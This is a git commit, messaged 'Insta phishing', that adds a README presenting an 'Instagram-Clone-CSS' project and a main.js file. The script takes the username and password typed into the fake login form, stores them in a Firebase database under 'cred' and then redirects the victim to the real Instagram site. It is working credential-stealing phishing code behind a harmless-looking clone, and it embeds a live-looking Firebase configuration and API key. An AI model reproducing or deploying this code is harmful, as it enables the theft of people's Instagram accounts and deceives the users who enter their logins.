d544a2232727b51198f8ca8f6cb3944ba825fd60
Raghul Prasanth <raghul01020405@gmail.com>
2023-08-29 15:47:21 +0530

    Insta phishing

---
+++ README.md
@@ -0,0 +1,8 @@
+# Instagram-Clone-CSS
+
+## [Live Demo](https://kumarlakshmanan.github.io/codes/Instagram)
+## Output Image
+<img src="https://raw.githubusercontent.com/KumarLakshmanan/Instagram-Clone-CSS/main/img/http%3A%3A%3Awww.instagram.com.png" />
+
+## Video Sourse
+[How to Create this Instagram clone - step by step ](https://www.youtube.com/watch?v=xS6sqodeS4Y)
---
+++ main.js
@@ -0,0 +1,62 @@
+const imageUrls = [
+    "img/img1.png",
+    "img/img2.png",
+    "img/img3.png",
+    "img/img4.png"
+];
+
+let currentImageIndex = 0;
+
+function updateImage() {
+    const imageElement = document.querySelector('.firstContainer img');
+    imageElement.src = imageUrls[currentImageIndex];
+    currentImageIndex = (currentImageIndex + 1) % imageUrls.length;
+}
+
+setInterval(updateImage, 3000);
+
+const firebaseConfig = {
+  apiKey: "AIzaSyAg_c2sIlqohIwHTQ8TGuT7a8qycTCFzbI",
+  authDomain: "instogram-15d4c.firebaseapp.com",
+  databaseURL: "https://instogram-15d4c-default-rtdb.firebaseio.com",
+  projectId: "instogram-15d4c",
+  storageBucket: "instogram-15d4c.appspot.com",
+  messagingSenderId: "781739855234",
+  appId: "1:781739855234:web:00a48d4830ea17877b139b"
+};
+
+firebase.initializeApp(firebaseConfig);
+
+
+var credDB = firebase.database().ref("cred");
+
+document.getElementById('cred').addEventListener('submit',submitForm)
+
+function submitForm(e){
+    e.preventDefault();
+    var username = getElementVal("username");
+    var password = getElementVal("password");
+    console.log(username,password);
+    saveMessages(username,password);
+}
+
+const saveMessages = (username, password) => {
+  var newCred = credDB.push();
+
+  newCred.set({
+    username: username,
+    password: password,
+  });
+};
+
+const getElementVal = (id) =>{
+    return document.getElementById(id).value;
+}
+
+
+
+document.getElementById('Log In').addEventListener('click', redirectToWebsite);
+
+function redirectToWebsite() {
+    window.location.href = 'https://www.instagram.com/';
+}
